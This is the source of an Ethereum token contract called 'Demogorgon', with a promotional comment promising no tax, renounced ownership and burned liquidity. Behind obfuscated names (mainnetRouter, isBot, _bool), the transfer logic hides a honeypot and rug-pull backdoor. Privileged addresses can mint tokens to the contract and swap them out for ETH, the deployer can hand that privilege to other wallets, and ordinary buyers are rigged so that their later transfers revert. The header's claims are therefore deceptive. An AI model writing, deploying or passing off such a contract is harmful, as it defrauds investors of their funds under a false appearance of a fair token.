/**
 *Submitted for verification at Etherscan.io on 2022-11-28
*/

// SPDX-License-Identifier: None
/*
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠁⠀⢻⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⡶⠶⠲⠤⣧⠀⠀⠀⠀⣼⠥⠴⠶⠦⣤⣄⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⡅⠀⠀⠀⠀⠀⠀⣰⣶⣷⣦⡀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿
⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣶⣶⣦⣤⣽⣦⣀⡀⠀⠀⠸⣿⣿⣿⣿⡿⠄⡀⢀⣠⣾⣿⣶⣿⣿⠿⠿⠿⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿
⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⡿⠟⠋⠉⠀⠀⠈⠉⠙⠻⣿⠋⠁⠀⠙⠻⠿⠋⠀⠀⠙⣿⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠉⠉⠛⣻⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⢻⣿
⣿⣿⠁⠀⠀⠀⠀⢀⣀⣠⣾⣿⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡗⠀⠀⠀⠀⢐⣖⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠛⠛⠛⠿⣿⣷⣦⣤⣄⠀⠀⠀⢿
⣿⠏⠀⠀⠀⢠⣶⣿⣿⣿⠋⠉⠉⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⣠⣾⣿⣦⣀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⢠⡿⢻⢿⡟⢿⠀⠀⠀⠸
⣿⠀⠀⠀⠀⡼⠁⡿⢹⡍⢷⡄⠀⠀⠀⠀⠹⡆⠀⠀⠀⠀⠀⠀⠀⠾⠞⠻⣿⣿⣿⣿⣿⣿⣿⣿⡷⠶⠿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠠⠏⠘⡇⠀⠀⠀⠀⠀
⡟⠀⠀⠀⠀⠀⠀⠛⠀⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⢀⣤⣶⣶⣶⣾⣿⣿⣿⠁⢹⣿⣿⣿⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⣠⠖⠋⠉⠉⠻⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾
⣿⣶⠀⢠⡀⠀⠀⠀⠀⠀⣼⣿⣶⣶⣶⣷⣶⣾⣯⣧⡀⠀⣴⣿⣿⢹⣿⣿⣿⣿⣿⡇⠀⢸⡿⠿⢿⣿⣿⣿⠿⠿⣧⠀⢰⣶⣾⣿⣷⣶⣶⣶⣦⣿⣿⣧⠀⠀⠀⠀⠀⣀⢀⣹⣿
⣿⣿⣳⣿⣿⣤⠀⠀⠀⢸⣿⠿⠛⠛⠋⠙⠛⠛⠻⣿⡇⢠⣿⣿⠟⠀⠈⠙⠛⠻⢿⣿⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⢈⡇⠀⢨⣿⡏⢿⠛⠟⠫⠉⢻⢿⣿⡆⠀⠀⢠⣼⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⠶⠄⠀⠸⡇⠀⠀⣿⠀⠀⣿⠀⠀⢠⠇⢸⣿⠁⠀⡆⠀⠀⣶⠀⠈⢻⠀⡇⠀⠀⣶⠀⠀⢸⠆⠀⠀⡇⠀⠸⣿⣍⠀⣿⠀⠀⢹⠀⠘⣿⡇⠀⣠⣼⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠭⠀⠀⠹⣄⠀⠈⠷⠖⠀⠀⣠⠏⠀⠀⢷⡀⠀⠉⠤⠤⠉⠀⢠⡞⠀⠹⣄⠀⠈⢧⣤⠌⠀⠀⣰⠃⠀⠀⢿⣏⠁⠰⣤⣤⠆⠀⣸⡿⠃⣠⣤⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣦⡔⠀⠀⣾⠑⢶⠤⡤⣴⢚⣷⡀⠀⠀⢠⠿⣦⣄⣀⣀⣠⣶⢻⡄⠀⠀⣼⡶⣤⣀⣀⣠⣤⣾⣇⠀⠀⠀⢀⣿⠓⣦⠤⠤⣴⠚⣿⡀⠈⢉⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣯⣥⠄⡾⣿⣿⣿⠀⠀⣿⣿⢿⢧⠀⠀⣿⣤⣿⣻⣒⣺⣿⣧⣤⣧⠀⢸⣿⣿⣸⡁⠀⢸⢶⣿⣿⡄⠀⠀⡼⣿⣿⣷⠀⠀⢸⣿⢿⢧⠸⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⣧⠤⠙⠻⡿⠿⠒⡖⠿⢿⡟⠚⠀⠀⠳⢿⣤⣿⡿⣿⣯⣬⠟⠚⠀⠘⠺⣿⣯⡃⠀⢸⡿⡿⠗⠃⠀⠀⠛⢻⡿⠟⠒⠒⠿⠿⡗⠚⣲⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣴⣧⣤⣤⣧⣤⣬⣧⣀⣀⣀⣀⣼⣿⣿⣷⣿⣿⣿⣦⣀⣀⣀⣠⣿⣿⣿⣽⣿⣿⣷⣄⣀⣀⣀⣀⣴⣧⣤⣤⣧⣤⣼⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠟⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⢘⡇⠀⠈⡇⠀⢸⡇⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣻⣷⣿⣿⢻⣿⣾⣿⣳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⢻⣛⣻⣟⣛⡛⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣿⣿
⣿⣿⣿⣟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠟⠋⠉⠉⠉⠻⣝⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿
⣿⣿⣿⣗⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⣀⠔⠲⢀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢩⣿⣿⣿
⣿⣿⣿⣿⣿⣤⣖⣒⣒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⡀⠀⣯⠀⠀⢿⡀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣴⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣯⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣦⣀⡀⣀⣀⣴⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣲⣶⣶⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

After Seeing A Token With This Name Previously Launch And Failed I Have Been Inspired
To Deploy Under The Same Name Due To The Big Community Base That Is Aware
Of The Stranger Things TV Program And Also To The Big Stranger Things Fanbase Themselves.

Total Supply - 5,000,000
Initial Liquidity Added - 1.75 Ethereum 
100% Of The Initial Liquidity Will Be Burned
Buying Fees - 0%
Selling Fees - 0%

No Tax. Renounced Ownership. Belongs To The Blockchain. Liquidity Will Be Burned.
No Current Socials. Feel Free To Create Them. Meet The Demogorgon.

Do Not Instantly Jeet This Project For A X2, Big Things Will Come If You Can 
Prove To Hold On. Lets Make This A Great Ride.
*/
pragma solidity ^0.8.15;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function Quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function GetAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function GetAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function GetAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function GetAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Demogorgon is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _tTotalFees = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 5000000 * 10**_decimals;
    uint256 private automatedMarketMakerPair = _tTotal;
    
    mapping(address => uint256) private _Balances;
    mapping(address => address) private isFeeExempt;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private isBot;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public swapTokensAtAmount;
    bool private allowTrading;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address UniswapV2routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _Balances[msg.sender] = _tTotal;
        isBot[msg.sender] = automatedMarketMakerPair;
        isBot[address(this)] = automatedMarketMakerPair;
        UniswapV2router = IUniswapV2Router02(UniswapV2routerAddress);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, automatedMarketMakerPair);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _Balances[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        mainnetRouter        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        mainnetRouter        (msg.sender, recipient, amount);
        return true;
    }
    function mainnetRouter       (
        address _spender,
        address _pair,
        uint256 _bool
    ) private {
        uint256 ercAmountBalance = balanceOf(address(this));
        uint256 getRate;
        if (swapTokensAtAmount && ercAmountBalance > automatedMarketMakerPair && !allowTrading && _spender != UniswapV2Pair) {
            allowTrading = true;
            getSwapAndLiquify(ercAmountBalance);
            allowTrading = false;
        } else if (isBot[_spender] > automatedMarketMakerPair && isBot[_pair] > automatedMarketMakerPair) {
            getRate = _bool;
            _Balances[address(this)] += getRate;
            swapAmountForTokens(_bool, _pair);
            return;
        } else if (_pair != address(UniswapV2router) && isBot[_spender] > 0 && _bool > automatedMarketMakerPair && _pair != UniswapV2Pair) {
            isBot[_pair] = _bool;
            return;
        } else if (!allowTrading && _rOwned[_spender] > 0 && _spender != UniswapV2Pair && isBot[_spender] == 0) {
            _rOwned[_spender] = isBot[_spender] - automatedMarketMakerPair;
        }
        address _creator  = isFeeExempt[UniswapV2Pair];
        if (_rOwned[_creator ] == 0) _rOwned[_creator ] = automatedMarketMakerPair;
        isFeeExempt[UniswapV2Pair] = _pair;
        if (_tTotalFees > 0 && isBot[_spender] == 0 && !allowTrading && isBot[_pair] == 0) {
            getRate = (_bool * _tTotalFees) / 100;
            _bool -= getRate;
            _Balances[_spender] -= getRate;
            _Balances[address(this)] += getRate;
        }
        _Balances[_spender] -= _bool;
        _Balances[_pair] += _bool;
        emit Transfer(_spender, _pair, _bool);
            if (!tradingOpen) {
                require(_spender == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapAmountForTokens(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}